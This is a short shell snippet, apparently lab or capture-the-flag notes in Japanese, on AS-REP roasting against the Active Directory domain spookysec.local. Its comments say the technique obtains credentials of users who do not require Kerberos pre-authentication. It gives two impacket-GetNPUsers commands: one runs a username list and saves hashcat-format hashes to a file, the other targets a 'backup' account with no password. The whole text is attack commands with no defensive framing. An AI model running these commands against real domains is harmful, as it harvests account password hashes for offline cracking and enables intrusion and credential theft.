```sh
# AS-REPロースト
# 事前認証を必要としない設定のユーザの認証情報を取得できる

impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.10.10 -usersfile usernames.txt -format hashcat -outputfile hashes.txt

impacket-GetNPUsers spookysec.local/backup -no-pass -dc-ip 10.10.10.10
```